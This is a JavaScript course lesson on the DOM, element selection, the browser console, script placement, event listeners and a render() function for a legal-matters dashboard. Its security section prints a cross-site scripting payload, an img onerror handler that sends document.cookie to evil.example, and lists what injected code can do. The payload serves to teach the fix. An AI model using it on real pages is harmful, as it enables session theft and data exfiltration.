# Week 4 · Day 3 — The DOM & events: making the page react

*Two days of JavaScript have printed to a terminal. Today it lands **on the page** — and the page starts
answering back.*

**You'll ship:** the Week 3 Matter Intelligence dashboard, now **live** —
[`dashboard.html`](dashboard.html) + [`dashboard.js`](dashboard.js) with a search box and an "active only"
toggle that re-render the cards as you type.

> 👉 **Open both demos in your browser now** (double-click them):
> - [`events.html`](events.html) — the two-button warm-up. Click **Close one** and **Reset**.
> - [`dashboard.html`](dashboard.html) — today's build. Type in the search box; tick the checkbox.
>
> Keep `dashboard.js` open in your editor beside the page — and open the **browser console** (**⌥⌘I** on a Mac,
> **F12** on Windows → **Console**). Section 3 uses it as a live scratchpad, and you'll want it open all day.

> 📝 **Annotated copies:** [`events.annotated.html`](events.annotated.html),
> [`dashboard.annotated.html`](dashboard.annotated.html) and
> [`dashboard.annotated.js`](dashboard.annotated.js) are the same code with a plain-English comment on nearly
> every line. The annotated page loads the annotated script, so you can open it and read both halves together.

---

## 🎯 Objectives
- Explain what the **DOM** is, how it differs from the HTML file on disk, and read a page as a **tree** of nodes
  (parent, child, sibling).
- Find elements with **`getElementById`**, **`querySelector`** and **`querySelectorAll`**, and change them with
  **`textContent`** and **`innerHTML`** — knowing which calls return *one* element and which return a *list*.
- Use the **browser console** as a REPL for the live page, and read `null` vs `undefined` errors.
- Tell apart the three ways JavaScript reaches a page — an inline **`on…`** attribute, a **`<script>`** block, and
  **`<script src="app.js">`** — and say why the separate file is the one to reach for.
- Wire user actions to code with **`addEventListener`** (`click`, `input`, `change`).
- Read a control's current value — **`.value`** for inputs, **`.checked`** for checkboxes.
- Build a **`render()`** function that turns data into HTML, and call it from every event.

## ⚖️ Why it matters
This is the `<script>` block Week 3 told you not to touch. Every filter, toggle, search box and sortable table in
a Claude artifact is the pattern you're about to write — and once you can read it, you can change it. It's also
the last thing you'll ever do by hand: Week 5's React does all of today's wiring for you, and you'll only
appreciate *why* that's a relief if you've done it the manual way once.

---

## 1 · What the DOM actually is

**DOM** stands for **Document Object Model** — the browser's live, in-memory version of your page. The `.html`
file is the blueprint; the DOM is the building, and JavaScript can walk through it and change it while people are
standing inside.

Prove it to yourself: open `dashboard.html`, then use **View Source** — the `<div class="board">` is empty. Now
right-click a card → **Inspect** and look at the Elements panel — the cards are there. The file never changed;
the DOM did.

### The page is a tree

Elements nest inside elements, so the whole page is a **tree** of **nodes** with `document` at the root. Here is
`dashboard.html` the instant the browser finishes parsing it — which is exactly what the Elements panel draws:

```text
document
└── <html lang="en">
    ├── <head>
    │   ├── <meta charset="utf-8">
    │   ├── <meta name="viewport" …>
    │   ├── <title>                          "Matter Intelligence — live dashboard"
    │   └── <style>                          … the CSS
    └── <body>
        ├── <div class="wrap">
        │   ├── <header>
        │   │   ├── <h1>                     "Matter Intelligence"
        │   │   └── <p id="summary">         "Loading…"        ← a hook
        │   ├── <div class="controls">
        │   │   ├── <input id="search">                        ← a hook
        │   │   └── <label>
        │   │       ├── <input id="active-only">               ← a hook
        │   │       └── "Active only"        ← text is a node too
        │   └── <div id="board">             ← a hook, and empty
        └── <script src="dashboard.js">
```

That picture gives you the vocabulary every DOM error message and tutorial assumes:

- `<h1>` and `<p id="summary">` are **children** of `<header>`, and **siblings** of each other.
- `<header>` is their **parent**; `<div class="wrap">` and `<body>` are their **ancestors**.
- Everything drawn under `<body>` is a **descendant** of it.
- `document` is the **root** — the only node that isn't inside something else.
- The indentation is the nesting: **a child is always drawn one level to the right of its parent.**

`getElementById` is a shortcut past all of it — it dives straight to a node by its id, however deep it sits.
Without ids you'd be writing `document.body.children[0].children[1]`, which breaks the moment somebody adds a
`<div>` above it.

### The same tree, one second later

Now here's `<div id="board">` after `dashboard.js` has run `render()`:

```text
└── <div id="board">                        ← same node, no longer empty
    ├── <div class="card">
    │   ├── <h3>                            "M-1002"
    │   ├── <p>                             "Brightline LLC"
    │   ├── <p>
    │   │   └── <span class="tag">          "Litigation"
    │   ├── <p>
    │   │   └── <span class="tag">          "Active"
    │   └── <p class="amt">                 "$42,750.50"
    ├── <div class="card">                  … Acme Corp
    └── … four more
```

Six new subtrees, grown by a single line of JavaScript (`boardEl.innerHTML = shown.map(cardHtml).join("")`, which
you'll write in section 6). Meanwhile `dashboard.html` **on disk still has an empty `<div id="board">`** — reload
the page and the tree goes back to the first picture. The gap between those two trees *is* the DOM.

> **Legal analogy:** the HTML file is the **executed contract in the drawer**; the DOM is the **working copy on
> the table** that everyone is redlining right now.

## 2 · Finding and changing elements

```js
const summaryEl = document.getElementById("summary");

summaryEl.textContent = "6 of 6 matters";      // set plain text
boardEl.innerHTML = "<div class='card'>…</div>"; // set actual markup
```

An **`id`** in the HTML is the **hook** the script grabs. That's why `dashboard.html` gives ids to `#board`,
`#summary`, `#search` and `#active-only` — Week 3's "outline → data → **hooks**" reading, now paying off.

| Property | Sets | Use it when |
|---|---|---|
| `.textContent` | plain text | the value is just words or a number — **prefer this** |
| `.innerHTML` | parsed markup | you're inserting real HTML you built yourself |

> **Common pitfalls ⚠️** — `.innerHTML` **parses the string you give it as markup**, and some of that markup
> runs code. Never pass it text that came from a user or an outside system without escaping it first. This is the
> same "escaping" caution from Week 3 Day 4. Here the card HTML is built from our own trusted data, so it's fine.

### Why that's a *security* hole, specifically

Say the dashboard echoed the search box back to the user — the kind of line that looks harmless:

```js
summaryEl.innerHTML = "No matters found for " + searchInput.value;   // ⚠️ never do this
```

Now someone types this into the search box instead of a client name:

```html
<img src=x onerror="fetch('https://evil.example/steal?c=' + document.cookie)">
```

The browser parses that as a real `<img>` tag, tries to load an image named `x`, fails, and runs the `onerror`
handler — **attacker-written JavaScript now executing inside your page**. That's a **cross-site scripting (XSS)**
attack. A useful mental note: `.innerHTML` won't run a plain `<script>` tag you insert, which is why people
wrongly assume it's safe. It absolutely will run `onerror`, `onload`, `onmouseover` and friends, and there are
dozens of those. Trying to block the bad ones by hand is a losing game.

Once attacker code is running in your page, it is not "some other program" the browser can wall off — it *is*
your page, with every privilege your own code has:

| What the injected code can do | Why it works |
|---|---|
| **Steal the session** — read `document.cookie` or `localStorage` and POST it to the attacker's server | The token that proves "I am this logged-in user" lives in the page. With it they log in as that user from their own machine. |
| **Read everything on screen** — every client name, matter number and dollar amount in the DOM | The DOM is fully readable from script. Data the user was authorized to see gets copied out to a third party. |
| **Act as the user** — silently `fetch("/api/matters/1002", {method: "DELETE"})`, change the billing address, add a new user account | The request carries the real session cookie and comes from the real origin, so the server can't tell it apart from a genuine click. |
| **Keylog the page** — attach a listener to every `<input>` and stream what's typed | Section 4's `addEventListener` works just as well for an attacker. Passwords typed after the injection are captured. |
| **Phish in place** — overwrite the page with a convincing "your session expired, sign in again" form | The URL bar still shows *your* real domain and *your* real padlock, so the usual "check the address" advice fails the user. |

Two details that make this worse than it first sounds:

- **It doesn't have to be a search box.** Any string that arrives from outside is the same risk: a client name
  pulled from an API, a matter description another user saved last week, a filename, a URL parameter. When the
  payload is *stored* in your database and served to every colleague who opens that matter, one attacker gets
  every session in the firm — that's **stored XSS**, and it's the expensive kind.
- **It doesn't need the victim to click anything.** The `onerror` above fires the instant the markup is parsed.
  Simply loading the page is enough.

**The fix is boring, which is the point:**

- Use **`.textContent`** whenever the value is words or a number. It sets *text*, never markup, so
  `<img src=x onerror=…>` shows up on the page as those literal characters. That one property kills this entire
  attack class, and it covers the large majority of real cases.
- If you genuinely need markup, build the element and set the untrusted part as text:
  ```js
  const p = document.createElement("p");
  p.textContent = searchInput.value;   // safe: text goes in as text
  summaryEl.appendChild(p);
  ```
- Only reach for `.innerHTML` with a string **you** assembled from data you control — like `cardHtml()` in
  section 6 — or one you've run through a real escaping/sanitizing library. Don't write your own escaper.

React, in Week 5, takes this same position by default: `{value}` in JSX is escaped for you, and the only way to
inject raw markup is a property named `dangerouslySetInnerHTML` — deliberately ugly so you have to mean it.

### Other ways to find things

`getElementById` is the one today's code uses, because ids are the hooks we put there on purpose. But it isn't
the only door in, and you'll meet the others constantly:

| Call | Finds | Gives you back |
|---|---|---|
| `document.getElementById("close")` | the element with that **id** | **one element**, or `null` |
| `document.querySelector("#close")` | the **first** match for a **CSS selector** | **one element**, or `null` |
| `document.querySelectorAll("button")` | **every** match for a CSS selector | a **list** (use `[0]`, `.length`, `.forEach`) |
| `document.getElementsByTagName("p")` | every `<p>` | an `HTMLCollection` — **a list** |
| `document.getElementsByClassName("box")` | every element with that class | an `HTMLCollection` — **a list** |

`querySelector` takes **exactly the selectors you wrote in Week 3 Day 2** — `"#close"` for an id, `".box"` for a
class, `"button"` for a tag, `"p strong"` for a `<strong>` inside a `<p>`. That's the whole reason it's worth
learning: one selector language for styling *and* for finding.

> **Common pitfalls ⚠️** — the singular/plural distinction is where everyone gets bitten, twice:
> - `querySelector("close")` returns `null` — that's a *tag* selector looking for a `<close>` element. You meant
>   `querySelector("#close")`. The `#` is not optional the way it is in `getElementById("close")`.
> - The `getElementsBy…` calls and `querySelectorAll` hand back a **list, even when it contains one thing**.
>   `document.getElementsByTagName("p").innerHTML = "Closed"` does *nothing* to the page — and doesn't error
>   either, because you just stuck an `innerHTML` property onto a list object. You need
>   `document.getElementsByTagName("p")[0].innerHTML = "Closed"`. **Plural name → index it first.**

### Walking the tree

Because the DOM is the tree from section 1, every element also knows its neighbors — handy when you're poking
around, and the vocabulary behind React's "children" later:

```js
document.firstElementChild;                    // <html>
document.firstElementChild.lastElementChild;   // <body>  (head is firstElementChild)
document.querySelector(".box").children;       // the <p> and the two <button>s
document.getElementById("count").parentElement; // the <p> the count sits in
```

You'd rarely *write* code this way — chains like that break the moment somebody adds a `<div>`, which is exactly
why we use ids. But it's a great way to *read* an unfamiliar page.

## 3 · Explore it live — the console is a REPL for the page

Everything above you can try **right now, without editing a file**. Open [`events.html`](events.html), press
**⌥⌘I** (Mac) or **F12**, and click the **Console** tab. That prompt is the browser's **REPL** — the same
Read–Eval–Print Loop as `node` with no filename in the [Week 4 README](../README.md), except the thing it's wired
to is the live page in front of you. Anything you type runs against the real DOM, and you see the result
immediately in both the console *and* the window.

A tour worth actually typing, one line at a time:

```js
document.getElementById("count");            // <strong id="count">3</strong>
document.getElementById("count").textContent; // '3'   ← a string, not a number

document.querySelector("#close");            // the Close one button
document.querySelectorAll("button");         // a list of 2
document.querySelectorAll("button")[1];      // the Reset button
document.getElementsByTagName("button");     // HTMLCollection(2) [button#close, button#reset]

document.querySelector("button").click();    // fires the click handler — the count drops to 2
document.getElementById("close").textContent = "Close this one for sure!";  // the button relabels itself
```

That last pair is the whole lesson in two lines: you changed the page, the `.html` file on disk didn't move, and
**reloading throws all of it away**. The console edits the DOM, never the file.

> **Read the error messages — they're the fastest teacher on this page.** Four you will almost certainly cause:
>
> | What you typed | What the console says | What it means |
> |---|---|---|
> | `document.getElementByID("close")` | `…is not a function` | **Case matters.** It's `getElementById` — capital `I`, lowercase `d`. Not `ByID`, not `getElementsbyID`. |
> | `document.querySelector("close").click()` | Cannot read properties of **`null`** (reading 'click') | Nothing matched, so you called `.click()` on nothing. `"close"` is a tag selector — add the `#`. |
> | `document.querySelector("button")[1]` | Cannot read properties of **`undefined`** | `querySelector` returns *one* element; indexing it gives `undefined`. You want `querySelectorAll`. |
> | `document.getElementsByTagName("p").innerHTML = "…"` | *no error at all* | The silent one. You set a property on a **list**. Nothing on screen changes. Index it: `[0]`. |
>
> `null` means **"I looked and found nothing"** — usually a typo in the id or a missing `#`. `undefined` means
> **"that property doesn't exist on this thing"** — usually you have the wrong *kind* of thing. Learning to tell
> those two apart at a glance will save you more time this week than any other single skill.

> **Common pitfalls ⚠️** — opening a local page also logs `'file:' URLs are treated as unique security origins`.
> That one is **not your code** and nothing to fix: the browser is noting that a `file://` page gets no origin, so
> it can't fetch its neighbors. It's the same rule that makes Day 4's `import` need a real local server.

## 4 · Where the JavaScript lives — three options, one recommendation

Every page has to get its JavaScript from *somewhere*, and there are exactly three ways to do it. You've already
used two of them today without being told.

**Option 1 — an inline `on…` attribute.** The JavaScript is the *value of an HTML attribute*:

```html
<body onload="alert('Hello')">
  <p>Open matters: <strong id="count">3</strong></p>

  <button onclick="alert('Closed!')">Close one</button>
  <button onclick="document.getElementById('count').textContent = 3">Reset</button>
</body>
```

Every event in the table below has a matching attribute — `onload`, `onclick`, `onchange`, `oninput`. It works,
it's the oldest style on the web, and you *will* meet it in pages that predate you. Don't write new code this
way; the reasons are a few paragraphs down.

**Option 2 — a `<script>` block.** The code still lives in the HTML file, but in **one** place instead of
sprinkled across the markup:

```html
<script type="text/javascript">
  alert("Hello");
</script>
```

That's what [`events.html`](events.html) does. Two notes on that opening tag: `type="text/javascript"` is a
leftover from the 1990s — HTML5 assumes JavaScript, so a bare `<script>` is correct and shorter, which is what
`events.html` actually writes. (`type="module"` *does* still mean something — that's Day 4.)

**Option 3 — an external file.** The tag points at a `.js` file and its body stays empty:

```html
<script src="dashboard.js"></script>
```

That's [`dashboard.html`](dashboard.html) — the last line before `</body>`. **This is the one to reach for.**

> **Common pitfalls ⚠️** — a `<script src="…">` tag can't *also* contain code; anything between the tags is
> silently ignored. And the closing `</script>` is never optional — self-closing it as `<script src="x.js" />`
> swallows the rest of your page.

### Why `src="…"` wins

| | inline `onclick` | `<script>` block | `<script src="app.js">` |
|---|---|---|---|
| Syntax highlighting, linting, formatting | ❌ it's just a string to your editor | ~ partial | ✅ |
| TypeScript (Day 4, Week 5) | ❌ impossible | ❌ | ✅ |
| Cached by the browser across pages and reloads | ❌ re-sent with every page | ❌ | ✅ |
| Errors report a real file and line number | ❌ | ~ | ✅ |
| More than one handler on the same event | ❌ one attribute, one handler | ✅ | ✅ |
| Survives a strict `Content-Security-Policy` | ❌ blocked outright | ❌ blocked | ✅ |
| Importable, reusable, testable | ❌ | ❌ | ✅ |

Underneath the checkmarks it's the same argument Week 3 Day 2 made for an external stylesheet: **HTML for
structure, CSS for looks, JavaScript for behavior.** Ask "where does the Reset button get its behavior?" and
with `src` the answer is always the same — the `.js` file. With inline attributes it's "somewhere in 400 lines of
markup."

Three specifics worth naming:

- **Duplication.** `onclick="closeMatter()"` on six buttons is six copies of one decision. One
  `addEventListener` is one copy, and you change it once.
- **Scope.** Inline attributes run in the global scope, so every function they call has to be a global — which
  pushes you into hanging your whole app off `window`. Worse, names in the attribute resolve against the element
  and the document *first*, so `onclick="name = 'x'"` is not touching the variable you think it is.
- **Security.** An inline `on…` handler is the exact shape an XSS payload takes — a string of markup that runs
  code — which is why locked-down sites send a `Content-Security-Policy` header that refuses to execute inline
  scripts and `on…` attributes at all. It's the flip side of the `.innerHTML` warning above. Keeping your code
  in `.js` files means that protection costs you nothing.

**Where inline is still fine:** a throwaway demo like `events.html`, which you double-click with no server and no
build step — and a **Claude artifact**, which is a single HTML file *by definition* (Week 3 Day 4), so its
`<script>` block has nowhere else to go. That's the exception, and it's why artifacts look the way they do.

**And where the tag sits matters.** `dashboard.html` puts it at the very bottom of `<body>`. Move it into the
`<head>` and `getElementById` returns `null`, because the elements don't exist yet.

> **Go Deeper 🔧** — `<script defer src="dashboard.js"></script>` gets you both: in the `<head>`, the browser
> downloads the file *while* it parses the HTML, then runs it once the DOM is complete. `type="module"` scripts
> defer automatically — one more thing Day 4 hands you for free.

## 5 · Events — wiring an action to code

```js
searchEl.addEventListener("input", render);
activeOnlyEl.addEventListener("change", render);
```

`addEventListener(eventName, functionToRun)` says "when this happens, run this." The events you'll use most:

| Event | Fires when |
|---|---|
| `click` | a button is pressed |
| `input` | **every keystroke** in a text field |
| `change` | a checkbox is ticked, or a dropdown changes |
| `submit` | a form is submitted |

Reading what the user did:

```js
searchEl.value        // "acme"  — text inputs report .value (always a string)
activeOnlyEl.checked  // true    — checkboxes report .checked (a boolean)
```

> **Common pitfalls ⚠️** — `.value` is **always a string**, even from a number input. `"3" - 1` gives `2`, but
> `"3" + 1` gives `"31"`. Wrap it in `Number(...)` before doing arithmetic — see `events.html`, which does
> exactly that.

## 6 · The `render()` pattern — the big idea

Don't scatter DOM updates through your event handlers. Write **one** function that puts the page in the correct
state for the current data, and have every event call it:

```js
function render() {
  const term = searchEl.value.trim().toLowerCase();
  const activeOnly = activeOnlyEl.checked;

  const shown = matters
    .filter((m) => (activeOnly ? m.active : true))
    .filter((m) => m.client.toLowerCase().includes(term) || m.area.toLowerCase().includes(term));

  summaryEl.textContent = `${shown.length} of ${matters.length} matters · ${money(total)} billed`;
  boardEl.innerHTML = shown.map(cardHtml).join("");
}
```

There it is — **Day 2's `filter` → `map` pipeline, now driving a web page.** `cardHtml` is an arrow function that
turns one matter into one card's markup, `map` runs it over every row, and `.join("")` glues the strings
together. (Without `join`, you'd get commas between the cards.)

Two small touches worth copying: `.toLowerCase()` on both sides makes the search case-insensitive, and
`.includes("")` is always true — so an empty search box matches everything, for free.

> **Go Deeper 🔧** — Rebuilding the whole board on every keystroke looks wasteful, and at six rows it isn't. At
> six *thousand* it would be, and you'd reach for a library that updates only what changed. That library is
> React.

**The shape to remember: data → `render()` → HTML, and every event just calls `render()` again.**

> **No TypeScript twin today — on purpose.** Days 1, 2 and 4 each ship a `.ts` version, but typing raw DOM code
> means writing casts like `document.getElementById("search") as HTMLInputElement` on every lookup, because
> `getElementById` can't know what kind of element it found and might return `null`. That's real, and it's noise
> when the subject is events. In Week 5, React removes the problem rather than annotating it: you never look
> elements up, so there's nothing to cast.

---

## ✍️ Your turn — start in the console, then edit the files

**In the browser console, on `dashboard.html`** (nothing to save — reload to undo):
1. Get the summary line two different ways: `document.getElementById("summary")` and
   `document.querySelector("#summary")`. Confirm you got the same element.
2. Count the cards with `document.querySelectorAll(".card").length`. Now type `acme` in the search box and count
   again — you're watching `render()` rebuild the tree.
3. Change a card's heading by hand: `document.querySelectorAll(".card")[0].querySelector("h3").textContent = "MINE"`.
   Then reload and watch it come back — the file never changed.
4. Break it on purpose: run `document.getElementsByClassName("card").textContent = "X"` and confirm **nothing
   happens and nothing errors.** Say out loud why. Then fix it with an index.

**In `dashboard.js`:**

5. Add the practice area to the search — it's already there; now **break** it. Delete the
   `|| m.area.toLowerCase().includes(term)` clause, reload, and search `litigation`. Put it back.
6. Sort the cards biggest-first before mapping (`.sort((a, b) => b.billed - a.billed)` — remember to copy the
   array first).
7. Add a **"Reset"** button to `dashboard.html` that clears the search box, unticks the checkbox, and calls
   `render()`.

**In `events.html`:**

8. Add a third button, **"Close two"**, that subtracts 2 from the count (and never goes below 0).
9. **Feel the difference.** Delete the Reset listener from the `<script>` block and rewrite it as an
   `onclick="…"` attribute on the button instead. Reload — it still works. Now try making it do *two* things
   (reset the count **and** `alert("Reset")`) inside that one attribute, and notice what the quoting and the
   semicolons do to you. Then put the listener back.

<details><summary>✅ What it should look like</summary>

```js
// 4 — a list is not an element. This sets a property nobody reads:
document.getElementsByClassName("card").textContent = "X";   // no error, no effect
document.getElementsByClassName("card")[0].textContent = "X"; // this one works

// 6 — inside render(), between the filters and the map
const shown = [...matters]
  .sort((a, b) => b.billed - a.billed)
  .filter((m) => (activeOnly ? m.active : true))
  .filter((m) => m.client.toLowerCase().includes(term) || m.area.toLowerCase().includes(term));

// 7 — in dashboard.html, next to the checkbox:
//   <button id="reset">Reset</button>
document.getElementById("reset").addEventListener("click", () => {
  searchEl.value = "";
  activeOnlyEl.checked = false;
  render();
});

// 8 — in events.html
document.getElementById("close-two").addEventListener("click", () => {
  const n = Number(countEl.textContent);
  countEl.textContent = Math.max(0, n - 2);
});
```
```html
<!-- 9 — it works, and it's still the style to leave behind. Note that the inner strings have to
     switch to single quotes, because the attribute itself is already using double ones. -->
<button id="reset" onclick="document.getElementById('count').textContent = 3; alert('Reset')">Reset</button>
```
If nothing happens when you click, open the browser console (**⌥⌘I** on a Mac → Console). `null is not an
object` almost always means the `id` in your JavaScript doesn't match the `id` in your HTML — check the spelling.
</details>

## 📝 Recap
- The **DOM** is the browser's live model of the page — a **tree** of nodes, where indentation is nesting and
  every element has a parent, children and siblings. Changing it changes what people see, not the file.
- **`getElementById`** finds an element by its **hook**; **`.textContent`** sets text, **`.innerHTML`** sets markup.
- **`querySelector`** takes any Week 3 CSS selector and returns **one** element; `querySelectorAll` and every
  `getElementsBy…` return a **list you must index first** — the silent bug of the day.
- The **console is a REPL for the page**: `null` = found nothing, `undefined` = wrong kind of thing.
- JavaScript reaches a page three ways — an inline **`on…`** attribute, a **`<script>`** block, or
  **`<script src="app.js">`**. Prefer the file: cached, lintable, typeable, testable, and CSP-safe.
- **`addEventListener`** connects `click` / `input` / `change` to a function.
- Inputs report **`.value`** (a string); checkboxes report **`.checked`** (a boolean).
- One **`render()`** function owns the drawing; **every event just calls it again**.
- `map(...).join("")` turns a list of data into a block of HTML — the same `map` as Day 2.

## 🧠 Check yourself
1. Why does the `<script>` tag go at the bottom of `<body>`? *(so the elements exist before the code looks for them)*
2. When should you use `.textContent` instead of `.innerHTML`? *(whenever the value is plain text — it can't be
   mistaken for markup)*
3. `document.querySelector("card")` gives you `null`. What's wrong? *(that's a tag selector — a `<card>` element.
   You want `".card"`)*
4. Why does `document.getElementsByTagName("p").textContent = "hi"` change nothing *and* raise no error?
   *(a plural call returns a list, and you can set any property you like on a list — index it first)*
5. Your page has six delete buttons. Why is one `addEventListener` better than six `onclick` attributes?
   *(six copies of the same decision to keep in sync — and none of them lintable, typeable or cacheable)*
6. What does `.join("")` fix after a `.map()`? *(without it the array's commas end up in the page)*

## ➡️ Next — [04-modules-and-async](../04-modules-and-async/)
One file is fine for six matters. Friday you'll split this code into **modules** (`import`/`export`), meet the
shorthand React code is written in — destructuring, spread, optional chaining — and handle data that arrives
**later** with `async`/`await`. That's the last stop before React.

## 📖 Reference
- MDN — Introduction to the DOM: https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction
- MDN — `EventTarget.addEventListener`: https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener
- MDN — Events reference: https://developer.mozilla.org/en-US/docs/Web/Events
- MDN — `document.querySelector` / `querySelectorAll`:
  https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector
- Chrome DevTools — Console overview: https://developer.chrome.com/docs/devtools/console
- MDN — The `<script>` element (`src`, `defer`, `type`): https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script
- MDN — Inline event handlers, and why to avoid them:
  https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Building_blocks/Events#inline_event_handlers_—_dont_use_these
